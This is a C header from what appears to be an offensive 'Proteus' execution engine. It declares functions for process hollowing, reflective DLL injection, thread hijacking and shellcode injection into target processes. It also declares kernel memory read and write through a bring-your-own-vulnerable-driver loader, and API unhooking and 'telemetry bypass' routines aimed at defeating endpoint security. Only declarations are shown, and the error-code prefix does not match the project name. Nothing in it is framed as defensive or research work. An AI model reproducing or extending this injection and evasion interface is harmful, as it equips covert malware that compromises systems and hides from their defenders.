/* ============================================================================
 * Proteus- Execution Engine -- injection.h
 * Unified injection interface. Cross-platform.
 * ============================================================================ */
#ifndef INJECTION_H
#define INJECTION_H

#include <stddef.h>
#include <stdint.h>

#include "pal.h"

#ifdef __cplusplus
extern "C" {
#endif

/* Injection methods supported by the engine */
typedef enum {
    INJECT_METHOD_PROCESS_HOLLOWING = 0x01,
    INJECT_METHOD_REFLECTIVE_DLL    = 0x02,
    INJECT_METHOD_THREAD_HIJACKING  = 0x03,
    INJECT_METHOD_SHELLCODE         = 0x04
} InjectionMethod;

/* Configuration structure for injection requests.
 * targetPid: process ID when non-zero; otherwise targetImage must be valid.
 * payload: pointer to payload bytes (PE, DLL, or raw shellcode).
 * payloadSize: size of payload in bytes.
 * payloadPath: optional file path for payload (used for logging).
 * useDirectSyscalls: enable direct syscall path (Windows only).
 * unhookApi: pre-injection API unhooking and telemetry bypass.
 */
typedef struct {
    InjectionMethod method;
    uint32_t        targetPid;
    const char*     targetImage;
    const void*     payload;
    size_t          payloadSize;
    const char*     payloadPath;
    int             useDirectSyscalls;
    int             unhookApi;
} InjectionConfig;

/* PE parsing structure (Windows only). */
typedef struct {
    uint32_t imageBase;
    uint32_t imageSize;
    uint32_t entryPoint;
    uint32_t relocationTable;
    uint32_t importTable;
    uint32_t baseRelocationSize;
} PEInfo;

/* Main dispatcher -- validates config and dispatches to implementation.
 * Returns JOCKEY_ERR_OK (0) or a negative error code.
 * Thread-safety: caller must not mutate config concurrently.
 */
int inject_process(InjectionConfig* config);

/* Individual injection methods. */
int perform_process_hollowing(InjectionConfig* config);
int perform_reflective_injection(InjectionConfig* config);
int perform_thread_hijacking(InjectionConfig* config);
int perform_shellcode_injection(InjectionConfig* config);

/* PE helpers (Windows only; no-ops on Linux). */
int ParsePEHeaders(void* peData, PEInfo* info);
int RelocatePE(void* peData, uint32_t newBase);
int ResolveImports(void* peData);

/* BYOVD interface */
int load_byovd(const char* driver_path);
int unload_byovd(const char* driver_name);
int read_kernel_memory(uintptr_t address, void* buffer, size_t size);
int write_kernel_memory(uintptr_t address, const void* buffer, size_t size);

/* API unhooking / telemetry bypass */
int unhook_module(const char* module_name);
int bypass_telemetry(void);

#ifdef __cplusplus
}
#endif

#endif
